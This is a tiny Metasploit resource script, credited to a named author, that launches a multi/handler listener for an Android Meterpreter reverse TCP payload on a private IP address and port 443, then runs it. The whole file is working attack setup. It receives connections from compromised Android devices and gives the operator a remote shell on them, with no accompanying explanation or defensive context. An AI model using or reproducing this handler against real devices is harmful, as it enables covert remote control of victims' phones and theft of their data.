# Script created by Aaron Vigal http://www.aaronvigal.com
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp 
set lhost 10.1.6.133
set lport 443
clear
exploit
exit
